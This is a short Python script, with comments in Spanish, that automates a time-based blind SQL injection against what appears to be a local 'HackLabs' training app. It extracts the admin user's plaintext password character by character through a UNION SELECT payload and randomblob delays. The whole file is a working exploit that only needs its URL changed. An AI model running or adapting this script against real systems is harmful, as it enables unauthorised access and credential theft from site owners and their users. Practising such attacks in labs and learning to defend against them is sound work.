#!/usr/bin/env python3
"""
Script para automatizar la extracción de contraseñas con SQLi Time-Based Blind en HackLabs (modo hard)

Uso:
  python3 sqli_timebased_extractor.py

Ajusta la URL y parámetros según tu entorno.
"""
import requests
import string
import time

URL = "http://localhost:5000/sqli/search"
USERNAME = "admin"
MAX_LEN = 32  # Longitud máxima de la contraseña a extraer
CHARS = string.ascii_letters + string.digits + string.punctuation

TIME_THRESHOLD = 2.5  # Segundos para considerar que la condición es verdadera

headers = {
    "User-Agent": "Mozilla/5.0"
}

def extract_password():
    password = ""
    print(f"[+] Extrayendo password_plain para usuario: {USERNAME}")
    for pos in range(1, MAX_LEN+1):
        found = False
        for c in CHARS:
            payload = f"' UNION SELECT 0, (CASE WHEN (SELECT SUBSTR(password_plain,{pos},1) FROM users WHERE username='{USERNAME}')='{c}' THEN randomblob(300000000) ELSE 'x' END), 2, 3, 4 FROM products--"
            params = {"q": payload}
            start = time.time()
            r = requests.get(URL, params=params, headers=headers, timeout=10)
            elapsed = time.time() - start
            if elapsed > TIME_THRESHOLD:
                password += c
                print(f"[+] Posición {pos}: {c} (delay {elapsed:.2f}s)")
                found = True
                break
        if not found:
            print(f"[!] Fin de password o carácter no encontrado en posición {pos}")
            break
    print(f"[+] Password extraído: {password}")
    return password

if __name__ == "__main__":
    extract_password()
